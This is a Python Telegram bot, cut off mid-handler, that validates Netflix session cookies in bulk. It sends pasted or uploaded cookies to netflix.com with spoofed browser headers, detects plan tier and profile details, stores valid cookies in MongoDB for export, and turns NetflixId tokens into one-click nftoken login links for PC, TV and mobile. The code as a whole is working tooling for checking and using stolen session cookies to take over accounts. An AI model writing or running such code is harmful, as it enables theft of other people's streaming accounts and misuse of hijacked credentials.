#!/usr/bin/env python3
"""
NETFLIX COOKIES CHECKER BOT - TELEGRAM C2
Full-featured Netflix cookie validator with premium account detection.
Supports: Netscape format, Standard format, Base64 encoded format.
No proxy – direct connections.
"""

import os
import sys
import time
import json
import re
import base64
import logging
import asyncio
import aiohttp
import ssl
import uuid
import tempfile
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Optional, Set, Tuple, Any
from dataclasses import dataclass, field
from functools import wraps
from urllib.parse import urlparse, quote, unquote
import random
import string
import hashlib

# Telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application, CommandHandler, ContextTypes, 
    CallbackQueryHandler, MessageHandler, filters,
    ConversationHandler
)

# Database
from pymongo import MongoClient, ASCENDING, DESCENDING
import pymongo

# Load env
from dotenv import load_dotenv
load_dotenv()

# ----------------------------- CONFIG ----------------------------------
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://user:pass@cluster.mongodb.net/")
DATABASE_NAME = os.getenv("DATABASE_NAME", "netflix_bot")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "123456789").split(",")]

# API config
CHECK_TIMEOUT = int(os.getenv("CHECK_TIMEOUT", "30"))
MAX_BULK_CHECK = int(os.getenv("MAX_BULK_CHECK", "100"))
CONCURRENT_CHECKS = int(os.getenv("CONCURRENT_CHECKS", "5"))
AUTO_DELETE_EXPIRED = os.getenv("AUTO_DELETE_EXPIRED", "True").lower() == "true"
EXPORT_DIR = os.getenv("EXPORT_DIR", "exports")

# ----------------------------- LOGGING ---------------------------------
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler("netflix_bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("netflix_bot")

# ========================== PREMIUM EMOJI SUPPORT ============================
# This dict maps emoji characters to Telegram custom emoji IDs (for premium rendering)
# Use get_emoji() for message text with parse_mode="HTML"
# If an emoji is not mapped, it returns the original character – still works as regular emoji.
PREMIUM_EMOJIS = {
    # ---------- NewsEmoji pack (https://t.me/addemoji/NewsEmoji) ----------
    "✅": "5206607081334906820",      # галочка
    "❌": "5210952531676504517",      # крестик
    "⛔": "5260293700088511294",      # запрет
    "⛔️": "5260293700088511294",
    "⚠️": "5447644880824181073",      # жёлтый знак с восклицательным
    "🔔": "5458603043203327669",      # колокольчик
    "📌": "5391032818111363540",      # геолокация / булавка
    "📍": "5391032818111363540",
    "🔗": "5271604874419647061",      # ссылка
    "⭐": "5438496463044752972",       # звезда
    "🌟": "5438496463044752972",
    "🔥": "5424972470023104089",      # огонь
    "💥": "5276032951342088188",      # взрыв
    "📊": "5231200819986047254",      # диаграмма
    "📈": "5451882707875276247",      # график акции (вверх)
    "📉": "5246762912428603768",      # график идущий вниз
    "💬": "5443038326535759644",      # чат
    "🌐": "5447410659077661506",      # интернет
    "📢": "5424818078835115060",      # объявление
    "🔒": "5296369303661067030",      # замочек
    "📎": "5305265301917549162",      # скрепка
    "⚙️": "5341715473882955310",      # настройки
    "⚙": "5341715473882955310",
    "⏳": "5386367538735104399",      # загрузка
    "🔄": "5386367538735104399",      # загрузка / обновление
    "📅": "5413879192267805083",      # календарь
    "💡": "5422439311196834318",      # лампочка / идея
    "💰": "5409048419211682843",      # доллар
    "💶": "5233326571099534068",      # евро
    "💷": "5290017777174722330",      # фунты
    "💴": "5278751923338490157",      # юани
    "₽": "5231449120635370684",       # российский рубль
    "🎙️": "5224736245665511429",     # микрофон
    "🎙": "5224736245665511429",
    "📝": "5406683434124859552",      # скидка / карандаш? (лучше оставить)
    "✏️": "5395444784611480792",      # карандаш который пишет
    "✏": "5395444784611480792",
    "🔊": "5388632425314140043",      # динамик
    "🔇": "5388632425314140043",      # динамик (можно использовать)
    "📌": "5391032818111363540",      # булавка (повтор)
    "🎁": "5415655814079723871",      # топ / подарок? (не точно)
    "🏷️": "5985433648810171091",     # тег (из TgAndroidIcons)
    "🏷": "5985433648810171091",
    "👤": "5967456680940671207",      # контакт / профиль (из TgAndroidIcons)
    "👥": "5942877472163892475",      # люди
    "📱": "5359484256097673786",      # Safari? но лучше использовать iPhone
    "🖥️": "5323440478232783499",     # MacBook
    "🖥": "5323440478232783499",
    "💻": "5323440478232783499",      # MacBook как компьютер
    "📺": "5359484256097673786",      # Safari как TV? нет, лучше оставить как есть
    "📲": "5449727858358374321",      # iPhone
    "🪪": "5839354140261619193",      # транслировать? (не точно)

    # ---------- Логотипы приложений (logo_by_TgEmojiBot) ----------
    "💎": "5206208353751024833",      # Telegram (но это не алмаз, но используем как премиум)
    "🤖": "5931415565955503486",      # бот / ИИ
    "🧠": "5931415565955503486",      # ИИ
    "🎬": "5206230030450975877",      # YouTube
    "📷": "5206383450977750405",      # Instagram
    "🐦": "5204061664671976334",      # X (Twitter)
    "🎮": "5206637287839910058",      # Twitch
    "💿": "5204357742537492089",      # Visa
    "💳": "5206505943445034137",      # Mastercard
    "🌍": "5204049982360930089",      # Opera (как браузер)
    "🔍": "5290017777174722330",      # не точно

    # ---------- TgAndroidIcons (бело-чёрные) ----------
    "⚡": "5877260593903177342",      # настройки? но используем как настройки
    "🆔": "5877485980901971030",      # значок данных? но используем как ID
    "🔑": "6005570495603282482",      # ключ
    "📁": "5899757765743615694",      # установить? но используем как папку
    "🔄": "5879785854284599288",      # информация? нет, лучше reload
    "⛔": "5872829476143894491",      # запрет / отмена
    "📤": "5877468380125990242",      # переслать (как upload)
    "📥": "5877468380125990242",      # переслать (download)
    "🗑️": "5879896690210639947",      # корзина
    "🗑": "5879896690210639947",
    "📋": "5877301185639091664",      # скопировать
    "📄": "5879841310902324730",      # карандаш (документ)
    "📝": "5879841310902324730",      # карандаш
    "🔄": "5877410604225924969",      # обновления (reload)
    "❓": "5879813604068298387",      # восклицательный знак? но используем как вопрос
    "❗": "5879813604068298387",      # восклицательный знак
    "ℹ️": "5879785854284599288",      # информация
    "ℹ": "5879785854284599288",
    "🔊": "5890997763331591703",      # динамик
    "🎧": "6007938409857815902",      # наушники
    "📌": "5796440171364749940",      # булавка
    "📎": "5877597667231534929",      # лист / список (можно как вложение)
    "📊": "5931472654660800739",      # диаграмма
    "👁️": "5960714428394507968",      # глаз / просмотры
    "👁": "5960714428394507968",
    "💊": "5933768993285345899",      # лекарства
    "🎵": "5891249688933305846",      # музыка

    # ---------- Языки программирования ----------
    "🐍": "5260480440971570446",      # Python
    "☕": "5258023925836690090",      # Java
    "🦀": "5257955893554721164",      # C (не точно)
    "📦": "5301137237050663843",      # Docker
    "🐳": "5301137237050663843",      # Docker
    "🐧": "5929096876321149063",      # Linux
    "💻": "5301233981189005137",      # Terminal
    "⚛️": "5286558630726606218",      # React? (нет в списке, оставим plain)

    # ---------- Игры ----------
    "🎮": "5208436234891850859",      # Epic Games (но используем как игры)
    "🕹️": "5208436234891850859",
    "🕹": "5208436234891850859",

    # ---------- Прочее ----------
    "🦇": "5811901387910418000",      # GTA Online (но используем как разработчик)
    "👑": "5413879192267805083",      # календарь? но можно как корону (нет точного)
    "📦": "5877316724830768997",      # SIM карта? но используем как упаковку
    "🔄": "5845943483382110702",      # обновить (reload)
    "🔙": "5967355281057779430",      # назад
    "🔜": "5967355281057779430",      # назад (скоро)
}

def get_emoji(emo: str) -> str:
    """
    Returns the Telegram custom emoji HTML tag if the emoji is in PREMIUM_EMOJIS,
    otherwise returns the original emoji character.
    Use this ONLY for message text with parse_mode='HTML', NOT for button labels.
    """
    emoji_id = PREMIUM_EMOJIS.get(emo)
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{emo}</tg-emoji>'
    return emo

# ========================== UTILITY FUNCTIONS =============================
def make_aware(dt):
    if dt is None:
        return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

def escape_markdown(text: str) -> str:
    if not text:
        return ""
    special_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join(f'\\{char}' if char in special_chars else char for char in str(text))

def random_string(length: int = 16) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def parse_netscape_cookie(cookie_text: str) -> Dict[str, str]:
    cookie_dict = {}
    lines = cookie_text.strip().split('\n')
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split()
        if len(parts) >= 7:
            name = parts[5]
            value = parts[6]
            cookie_dict[name] = value
    return cookie_dict

def validate_cookie(cookie: str) -> bool:
    if not cookie:
        return False
    cookie = cookie.strip()
    # Netscape format check
    if '.netflix.com' in cookie and 'TRUE' in cookie:
        return True
    # Standard format check
    if '=' in cookie and ';' in cookie:
        netflix_patterns = ['NetflixId', 'nfvdid', 'SecureNetflixId', 'netflix_session']
        cookie_lower = cookie.lower()
        for pattern in netflix_patterns:
            if pattern.lower() in cookie_lower:
                return True
    # Base64 check
    try:
        decoded = base64.b64decode(cookie, validate=True)
        if decoded:
            try:
                decoded_str = decoded.decode('utf-8')
                if '=' in decoded_str and ('NetflixId' in decoded_str or 'netflix' in decoded_str.lower()):
                    return True
            except:
                pass
    except:
        pass
    return False

def parse_cookie(cookie: str) -> Dict[str, str]:
    cookie = cookie.strip()
    cookie_dict = {}
    # Try Netscape first
    if '.netflix.com' in cookie and 'TRUE' in cookie:
        try:
            cookie_dict = parse_netscape_cookie(cookie)
            if cookie_dict:
                return cookie_dict
        except Exception as e:
            logger.debug(f"Netscape parse failed: {e}")
    # Try Base64 decode
    try:
        decoded = base64.b64decode(cookie, validate=True)
        try:
            cookie = decoded.decode('utf-8')
        except:
            pass
    except:
        pass
    # Standard cookie string
    if ';' in cookie:
        parts = cookie.split(';')
    else:
        parts = cookie.split()
    for part in parts:
        part = part.strip()
        if '=' in part:
            key, value = part.split('=', 1)
            cookie_dict[key.strip()] = value.strip()
    return cookie_dict

def extract_nftoken(cookie_str: str) -> Optional[str]:
    """
    Extract the 'ct' parameter from the NetflixId cookie value.
    NetflixId is usually in format: "value&ct=xxxxx&..."
    """
    cookie_dict = parse_cookie(cookie_str)
    netflix_id = cookie_dict.get('NetflixId')
    if not netflix_id:
        # Try to find NetflixId in raw cookie string
        match = re.search(r'NetflixId=([^;]+)', cookie_str)
        if match:
            netflix_id = match.group(1)
    if not netflix_id:
        return None
    # Decode URL-encoded parts
    netflix_id = unquote(netflix_id)
    # Split by '&' and find 'ct'
    for part in netflix_id.split('&'):
        if part.startswith('ct='):
            return part[3:]
    return None

def normalize_cookie(cookie: str) -> str:
    """Replace newlines with literal \n to store as single line"""
    cookie = cookie.replace('\r', '')
    cookie = cookie.replace('\n', '\\n')
    return cookie

def denormalize_cookie(cookie: str) -> str:
    """Restore newlines for parsing"""
    return cookie.replace('\\n', '\n')

def extract_cookies_from_text(content: str) -> List[str]:
    """
    Extract individual cookie strings from the text content.
    Each cookie is a single line (Netscape or standard format).
    Skips empty lines and comment lines (starting with #).
    """
    cookies = []
    lines = content.splitlines()
    for line in lines:
        line = line.strip()
        if not line:
            continue
        # Skip comment lines (starting with #)
        if line.startswith('#'):
            continue
        # Check if this line looks like a valid cookie
        if validate_cookie(line):
            cookies.append(line)
        else:
            # Could be a standard cookie without .netflix.com? But validate_cookie already handles that.
            # If it's not valid, we skip it.
            logger.debug(f"Skipping invalid cookie line: {line[:50]}...")
    return cookies

# ========================== DATABASE =====================================
class Database:
    def __init__(self, uri=MONGODB_URI, db_name=DATABASE_NAME):
        if not uri:
            logger.error("MONGODB_URI not set!")
            self.client = None
            self.db = None
            return
        self.client = MongoClient(uri, serverSelectionTimeoutMS=5000)
        self.db = self.client[db_name]
        self.users = self.db.users
        self.cookies = self.db.cookies
        self.checks = self.db.checks
        self.settings = self.db.settings
        self._init_indexes()
        self._init_defaults()
    
    def _init_indexes(self):
        try:
            self.users.create_index([("user_id", ASCENDING)], unique=True)
            self.users.create_index([("approved", ASCENDING)])
            self.cookies.create_index([("cookie_hash", ASCENDING)], unique=True)
            self.cookies.create_index([("status", ASCENDING)])
            self.cookies.create_index([("account_tier", ASCENDING)])
            self.cookies.create_index([("expires_at", ASCENDING)])
            self.cookies.create_index([("user_id", ASCENDING)])
            self.checks.create_index([("timestamp", DESCENDING)])
            self.checks.create_index([("user_id", ASCENDING)])
            logger.info("Database indexes initialized")
        except Exception as e:
            logger.error(f"Index initialization error: {e}")
    
    def _init_defaults(self):
        for admin_id in ADMIN_IDS:
            self.users.update_one(
                {"user_id": admin_id},
                {"$set": {
                    "username": "admin",
                    "approved": True,
                    "is_admin": True,
                    "created_at": get_current_time()
                }},
                upsert=True
            )
        self.settings.update_one(
            {"_id": "global"},
            {"$setOnInsert": {
                "auto_delete_expired": AUTO_DELETE_EXPIRED,
                "max_bulk_check": MAX_BULK_CHECK,
                "concurrent_checks": CONCURRENT_CHECKS,
                "updated_at": get_current_time()
            }},
            upsert=True
        )
    
    def get_user(self, user_id: int) -> Optional[Dict]:
        user = self.users.find_one({"user_id": user_id})
        if user:
            if user.get("created_at"):
                user["created_at"] = make_aware(user["created_at"])
            if user.get("approved_at"):
                user["approved_at"] = make_aware(user["approved_at"])
        return user
    
    def create_user(self, user_id: int, username: str = None) -> Dict:
        existing = self.get_user(user_id)
        if existing:
            return existing
        user_data = {
            "user_id": user_id,
            "username": username,
            "approved": False,
            "is_admin": user_id in ADMIN_IDS,
            "approved_at": None,
            "total_checks": 0,
            "valid_cookies": 0,
            "created_at": get_current_time(),
            "last_active": get_current_time()
        }
        try:
            self.users.insert_one(user_data)
            logger.info(f"Created user: {user_id}")
        except pymongo.errors.DuplicateKeyError:
            return self.get_user(user_id)
        return user_data
    
    def approve_user(self, user_id: int) -> bool:
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": True, "approved_at": get_current_time()}}
        )
        return result.modified_count > 0
    
    def disapprove_user(self, user_id: int) -> bool:
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": False, "approved_at": None}}
        )
        return result.modified_count > 0
    
    def is_user_approved(self, user_id: int) -> bool:
        user = self.get_user(user_id)
        if not user:
            return False
        return user.get("approved", False)
    
    def update_user_activity(self, user_id: int):
        self.users.update_one(
            {"user_id": user_id},
            {"$set": {"last_active": get_current_time()}}
        )
    
    def increment_user_stats(self, user_id: int, check_count: int = 1, valid_count: int = 0):
        self.users.update_one(
            {"user_id": user_id},
            {"$inc": {"total_checks": check_count, "valid_cookies": valid_count}}
        )
    
    def add_cookie(self, cookie: str, user_id: int = None) -> str:
        cookie = normalize_cookie(cookie.strip())
        cookie_hash = hashlib.sha256(cookie.encode()).hexdigest()
        existing = self.cookies.find_one({"cookie_hash": cookie_hash})
        if existing:
            return existing.get("_id")
        cookie_id = str(uuid.uuid4())
        cookie_data = {
            "_id": cookie_id,
            "cookie": cookie,
            "cookie_hash": cookie_hash,
            "user_id": user_id,
            "status": "pending",
            "account_tier": None,
            "profile_name": None,
            "profile_language": None,
            "maturity_level": None,
            "expires_at": None,
            "checked_at": None,
            "created_at": get_current_time(),
            "views": 0
        }
        try:
            self.cookies.insert_one(cookie_data)
            logger.info(f"Added cookie: {cookie_id[:8]}")
            return cookie_id
        except pymongo.errors.DuplicateKeyError:
            return self.cookies.find_one({"cookie_hash": cookie_hash})["_id"]
    
    def add_cookies_bulk(self, cookies: List[str], user_id: int = None) -> List[Dict]:
        results = []
        for cookie in cookies:
            cookie = cookie.strip()
            if cookie and validate_cookie(cookie):
                try:
                    cookie_id = self.add_cookie(cookie, user_id)
                    results.append({"cookie": cookie, "id": cookie_id, "status": "added"})
                except Exception as e:
                    results.append({"cookie": cookie, "status": "error", "error": str(e)})
            else:
                results.append({"cookie": cookie, "status": "invalid_format"})
        return results
    
    def get_cookie(self, cookie_id: str) -> Optional[Dict]:
        return self.cookies.find_one({"_id": cookie_id})
    
    def find_cookie_by_prefix(self, prefix: str) -> Optional[Dict]:
        """
        Find a cookie whose _id starts with the given prefix.
        Returns the first match if multiple, or None if none.
        """
        # Use regex to match starting with prefix (case-sensitive)
        docs = list(self.cookies.find({"_id": {"$regex": f"^{prefix}"}}).limit(2))
        if len(docs) == 1:
            return docs[0]
        elif len(docs) > 1:
            return None  # ambiguous
        return None
    
    def get_cookie_by_hash(self, cookie_hash: str) -> Optional[Dict]:
        return self.cookies.find_one({"cookie_hash": cookie_hash})
    
    def update_cookie_status(self, cookie_id: str, status: str, details: Dict = None):
        updates = {
            "status": status,
            "checked_at": get_current_time()
        }
        if details:
            updates.update(details)
        self.cookies.update_one({"_id": cookie_id}, {"$set": updates})
    
    def get_pending_cookies(self, limit: int = 100) -> List[Dict]:
        return list(self.cookies.find({"status": "pending"}).limit(limit))
    
    def get_valid_cookies(self, limit: int = 100) -> List[Dict]:
        return list(self.cookies.find({"status": "valid"}).sort("checked_at", -1).limit(limit))
    
    def get_cookie_stats(self) -> Dict:
        total = self.cookies.count_documents({})
        valid = self.cookies.count_documents({"status": "valid"})
        invalid = self.cookies.count_documents({"status": "invalid"})
        expired = self.cookies.count_documents({"status": "expired"})
        pending = self.cookies.count_documents({"status": "pending"})
        tier_stats = {}
        for tier in ["Basic", "Standard", "Premium"]:
            tier_stats[tier] = self.cookies.count_documents({
                "status": "valid",
                "account_tier": tier
            })
        return {
            "total": total,
            "valid": valid,
            "invalid": invalid,
            "expired": expired,
            "pending": pending,
            "tiers": tier_stats
        }
    
    def delete_cookie(self, cookie_id: str) -> bool:
        result = self.cookies.delete_one({"_id": cookie_id})
        return result.deleted_count > 0
    
    def delete_invalid_cookies(self) -> int:
        result = self.cookies.delete_many({"status": {"$in": ["invalid", "expired"]}})
        return result.deleted_count
    
    def cleanup_expired(self) -> int:
        result = self.cookies.delete_many({"status": "expired"})
        return result.deleted_count
    
    def log_check(self, user_id: int, cookie_id: str, status: str, details: Dict = None):
        check_data = {
            "user_id": user_id,
            "cookie_id": cookie_id,
            "status": status,
            "details": details,
            "timestamp": get_current_time()
        }
        self.checks.insert_one(check_data)
    
    def get_user_checks(self, user_id: int, limit: int = 20) -> List[Dict]:
        return list(self.checks.find({"user_id": user_id}).sort("timestamp", -1).limit(limit))

db = Database()

# ========================== NETFLIX CHECKER ENGINE =========================
class NetflixChecker:
    @staticmethod
    async def check_single_cookie(cookie: str) -> Dict:
        result = {
            "valid": False,
            "account_tier": None,
            "profile_name": None,
            "profile_language": None,
            "maturity_level": None,
            "expires_at": None,
            "error": None
        }
        
        cookie_raw = denormalize_cookie(cookie)
        cookie_dict = parse_cookie(cookie_raw)
        if not cookie_dict:
            result["error"] = "Invalid cookie format"
            return result
        
        cookie_str = "; ".join([f"{k}={v}" for k, v in cookie_dict.items()])
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Cookie": cookie_str,
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cache-Control": "max-age=0",
            "DNT": "1"
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                timeout = aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=15)
                url = "https://www.netflix.com/in/"
                
                async with session.get(
                    url,
                    headers=headers,
                    timeout=timeout,
                    ssl=False,
                    allow_redirects=True
                ) as resp:
                    final_url = str(resp.url)
                    html = await resp.text(errors='ignore')
                    html_lower = html.lower()
                    final_lower = final_url.lower()
                    
                    # Strict validation
                    if "login" in final_lower or "signin" in final_lower:
                        result["error"] = "Redirected to login page"
                        return result
                    
                    # Check if we are logged in
                    logged_in = False
                    if any(x in final_lower for x in ["browse", "profiles", "watch", "title"]):
                        logged_in = True
                    elif "logout" in html_lower:
                        logged_in = True
                    elif "profile" in html_lower and "sign out" in html_lower:
                        logged_in = True
                    elif 'netflix' in html_lower and 'sign in' not in html_lower:
                        if "whoops" in html_lower or "sorry" in html_lower:
                            logged_in = False
                        else:
                            logged_in = "profile" in html_lower or "avatar" in html_lower
                    
                    if not logged_in:
                        result["error"] = "Cookie invalid or expired"
                        return result
                    
                    result["valid"] = True
                    
                    # Extract details using improved methods
                    result["account_tier"] = NetflixChecker._extract_tier(html)
                    result["profile_name"] = NetflixChecker._extract_profile_name(html)
                    result["profile_language"] = NetflixChecker._extract_language(html)
                    result["maturity_level"] = NetflixChecker._extract_maturity(html)
                    
                    # Extract expiration from HTML or assume session
                    expire_match = re.search(r'"expires"\s*:\s*"([^"]+)"', html, re.IGNORECASE)
                    if expire_match:
                        result["expires_at"] = expire_match.group(1)
                    else:
                        # Default session expiry ~30 days
                        result["expires_at"] = (get_current_time() + timedelta(days=30)).strftime("%Y-%m-%d")
                    
                    return result
                    
        except asyncio.TimeoutError:
            result["error"] = "Timeout"
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    @staticmethod
    def _extract_tier(html: str) -> str:
        # Look for plan name in JSON or text
        patterns = [
            r'"accountTier"\s*:\s*"([^"]+)"',
            r'"planName"\s*:\s*"([^"]+)"',
            r'"plan_name"\s*:\s*"([^"]+)"',
            r'planName["\']?\s*[:=]\s*["\']([^"\']+)',
            r'plan[_-]?name["\']?\s*[:=]\s*["\']([^"\']+)',
        ]
        for pat in patterns:
            match = re.search(pat, html, re.IGNORECASE)
            if match:
                plan = match.group(1).lower()
                if "premium" in plan:
                    return "Premium"
                elif "standard" in plan:
                    return "Standard"
                elif "basic" in plan:
                    return "Basic"
                else:
                    return plan.title()
        # Fallback: count maturity levels
        levels = re.findall(r'maturityLevel["\']?\s*[:=]\s*["\']([^"\']+)', html, re.IGNORECASE)
        if len(levels) >= 4:
            return "Premium"
        elif len(levels) >= 3:
            return "Standard"
        elif len(levels) >= 2:
            return "Basic"
        return "Unknown"
    
    @staticmethod
    def _extract_profile_name(html: str) -> str:
        patterns = [
            r'"profileName"\s*:\s*"([^"]+)"',
            r'"profile_name"\s*:\s*"([^"]+)"',
            r'profileName["\']?\s*[:=]\s*["\']([^"\']+)',
            r'name["\']?\s*[:=]\s*["\']([^"\']+)"'
        ]
        for pat in patterns:
            match = re.search(pat, html, re.IGNORECASE)
            if match:
                return match.group(1).strip()
        return "Unknown"
    
    @staticmethod
    def _extract_language(html: str) -> str:
        match = re.search(r'"language"\s*:\s*"([^"]+)"', html, re.IGNORECASE)
        if match:
            return match.group(1)
        match = re.search(r'language["\']?\s*[:=]\s*["\']([^"\']+)', html, re.IGNORECASE)
        if match:
            return match.group(1)
        return "en-US"
    
    @staticmethod
    def _extract_maturity(html: str) -> str:
        match = re.search(r'"maturityLevel"\s*:\s*"([^"]+)"', html, re.IGNORECASE)
        if match:
            return match.group(1)
        return "Unknown"
    
    @staticmethod
    async def check_bulk_cookies(cookies: List[str], progress_callback=None) -> List[Dict]:
        results = []
        semaphore = asyncio.Semaphore(CONCURRENT_CHECKS)
        
        async def check_one(cookie: str, index: int):
            async with semaphore:
                result = await NetflixChecker.check_single_cookie(cookie)
                result["cookie"] = cookie
                result["index"] = index
                if progress_callback:
                    await progress_callback(index, len(cookies))
                return result
        
        tasks = [check_one(cookie, i) for i, cookie in enumerate(cookies)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        processed = []
        for result in results:
            if isinstance(result, Exception):
                processed.append({
                    "cookie": "",
                    "valid": False,
                    "error": str(result)
                })
            else:
                processed.append(result)
        return processed

# ========================== INLINE KEYBOARD BUILDERS =====================
def build_login_keyboard(cookie_id: str, nftoken: str) -> InlineKeyboardMarkup:
    """
    Build keyboard with device login buttons.
    Using standard Netflix login URL with nftoken.
    For TV, we also provide the /tv8 endpoint which works for TV activation.
    """
    keyboard = [
        [
            InlineKeyboardButton("💻 PC / Web", url=f"https://www.netflix.com/login?nftoken={nftoken}"),
            InlineKeyboardButton("📺 TV", url=f"https://www.netflix.com/tv8?nftoken={nftoken}"),
        ],
        [
            InlineKeyboardButton("📱 Android", url=f"https://www.netflix.com/login?nftoken={nftoken}"),
            InlineKeyboardButton("🍏 iPhone", url=f"https://www.netflix.com/login?nftoken={nftoken}"),
        ],
        [
            InlineKeyboardButton("📤 Upload File", callback_data=f"upload_{cookie_id}"),
            InlineKeyboardButton("🔄 Restart", callback_data="restart"),
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

# ========================== STYLISH HELPERS ==============================
SEP = "━━━━━━━━━━━━━━━━━━━━"

def format_header(title: str, emoji: str = "🎬") -> str:
    return f"{get_emoji(emoji)} <b>{title}</b> {get_emoji('🌟')}"

# ========================== TELEGRAM HANDLERS ============================
def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text(
                f"{get_emoji('⛔️')} <b>Unauthorized</b>\nYou are not allowed to use this command.",
                parse_mode="HTML"
            )
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    db.create_user(user_id, username)
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(
            f"{get_emoji('⛔️')} <b>Access Denied</b>\n\n"
            f"Your account is not approved for this bot.\n"
            f"Please contact an administrator to get access.",
            parse_mode="HTML"
        )
        return

    text = (
        f"{format_header('Netflix Cookie Checker', '🎬')}\n"
        f"{SEP}\n"
        f"{get_emoji('⚡')} <b>Powerful Cookie Validator</b>\n"
        f"Check, validate, and generate device login links.\n\n"
        f"{get_emoji('📌')} <b>Commands</b>\n"
        f"  • /check <code>&lt;cookie&gt;</code> – Single check\n"
        f"  • Or send a <b>.txt</b> file directly – Bulk check\n"
        f"  • /login <code>&lt;cookie_id&gt;</code> – Device login\n"
        f"  • /valid – Get valid cookies\n"
        f"  • /help – This message\n\n"
        f"{get_emoji('📦')} <b>Supported Formats</b>\n"
        f"Standard: <code>name=value; name2=value2</code>\n"
        f"Netscape: <code>.netflix.com TRUE / ...</code>\n"
        f"Base64: <code>bmV0ZmxpeF9zZXNzaW9u...</code>\n\n"
        f"{get_emoji('👑')} <b>Admin Commands</b>\n"
        f"  /approve <code>&lt;user_id&gt;</code>\n"
        f"  /disapprove <code>&lt;user_id&gt;</code>\n"
        f"  /users – List all users\n"
        f"  /export – Export valid cookies\n"
        f"  /cleanup – Delete invalid cookies\n"
        f"  /clear – Dangerous: clear all cookies\n\n"
        f"{get_emoji('🦇')} <b>Developer:</b> @Xalonexdev03"
    )
    await update.message.reply_text(text, parse_mode="HTML", disable_web_page_preview=True)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

async def check_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(
            f"{get_emoji('⛔️')} <b>Access Denied</b>",
            parse_mode="HTML"
        )
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            f"{get_emoji('❌')} <b>Missing Cookie</b>\n\n"
            f"Usage: <code>/check &lt;cookie&gt;</code>\n"
            f"Or paste the cookie directly in this chat.\n"
            f"Or send a <b>.txt</b> file with multiple cookies.",
            parse_mode="HTML"
        )
        return

    cookie = " ".join(args)
    if not validate_cookie(cookie):
        await update.message.reply_text(
            f"{get_emoji('⛔️')} <b>Invalid Cookie Format</b>\n\n"
            f"Supported formats: Standard, Netscape, Base64.",
            parse_mode="HTML"
        )
        return

    cookie_id = db.add_cookie(cookie, user_id)
    # Show full ID so user can copy for /login
    msg = await update.message.reply_text(
        f"{get_emoji('⏳')} <b>Checking Cookie</b>\n"
        f"ID: <code>{cookie_id}</code>\n"
        f"Please wait...",
        parse_mode="HTML"
    )

    result = await NetflixChecker.check_single_cookie(cookie)

    if result.get("valid"):
        db.update_cookie_status(cookie_id, "valid", {
            "account_tier": result.get("account_tier"),
            "profile_name": result.get("profile_name"),
            "profile_language": result.get("profile_language"),
            "maturity_level": result.get("maturity_level"),
            "expires_at": result.get("expires_at")
        })
        db.increment_user_stats(user_id, 1, 1)
        status_text = f"{get_emoji('✅')} <b>ACCOUNT ACTIVE</b>"
    else:
        status = "expired" if "expired" in str(result.get("error", "")).lower() else "invalid"
        db.update_cookie_status(cookie_id, status, {"error": result.get("error")})
        db.increment_user_stats(user_id, 1, 0)
        status_text = f"{get_emoji('❌')} <b>INVALID / EXPIRED</b>"

    db.log_check(user_id, cookie_id, result.get("valid") and "valid" or "invalid", result)
    db.update_user_activity(user_id)

    # Build response
    if result.get("valid"):
        response = (
            f"{format_header('Cookie Validation Report', '✅')}\n"
            f"{SEP}\n"
            f"{status_text}\n\n"
            f"{get_emoji('📊')} <b>Plan:</b> <code>{result.get('account_tier', 'Unknown')}</code>\n"
            f"{get_emoji('👤')} <b>Profile:</b> <code>{result.get('profile_name', 'Unknown')}</code>\n"
            f"{get_emoji('🌍')} <b>Language:</b> <code>{result.get('profile_language', 'Unknown')}</code>\n"
            f"{get_emoji('🔞')} <b>Maturity:</b> <code>{result.get('maturity_level', 'Unknown')}</code>\n"
        )
        if result.get('expires_at'):
            response += f"{get_emoji('📅')} <b>Expires:</b> <code>{result.get('expires_at')}</code>\n"
        response += f"{get_emoji('🆔')} <b>Cookie ID:</b> <code>{cookie_id}</code>\n"

